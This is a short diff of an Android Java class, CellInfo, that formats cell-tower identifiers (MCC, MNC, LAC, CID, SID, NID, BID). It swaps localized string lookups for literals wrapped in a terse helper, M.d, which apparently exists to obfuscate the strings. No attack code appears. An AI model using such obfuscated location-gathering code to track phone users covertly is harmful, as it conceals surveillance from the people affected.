@@ -9,6 +9,8 @@
 
 package com.android.deviceinfo;
 
+import com.android.m.M;
+
 public class CellInfo {
 	public int mcc = -1;
 	public int mnc = -1; // sid
@@ -60,16 +62,16 @@ public class CellInfo {
 		final StringBuffer mb = new StringBuffer();
 
 		if (gsm) {
-			mb.append(Messages.getString("29_0") + mcc); //$NON-NLS-1$
-			mb.append(Messages.getString("29_1") + mnc); //$NON-NLS-1$
-			mb.append(Messages.getString("29_2") + lac); //$NON-NLS-1$
-			mb.append(Messages.getString("29_3") + cid); //$NON-NLS-1$
+			mb.append(M.d("MCC: ") + mcc); //$NON-NLS-1$
+			mb.append(M.d(" MNC: ") + mnc); //$NON-NLS-1$
+			mb.append(M.d(" LAC: ") + lac); //$NON-NLS-1$
+			mb.append(M.d(" CID: ") + cid); //$NON-NLS-1$
 		}
 
 		if (cdma) {
-			mb.append(Messages.getString("29_4") + sid); //$NON-NLS-1$
-			mb.append(Messages.getString("29_5") + nid); //$NON-NLS-1$
-			mb.append(Messages.getString("29_6") + bid); //$NON-NLS-1$
+			mb.append(M.d("SID: ") + sid); //$NON-NLS-1$
+			mb.append(M.d(" NID: ") + nid); //$NON-NLS-1$
+			mb.append(M.d(" BID: ") + bid); //$NON-NLS-1$
 		}
 
 		return mb.toString();
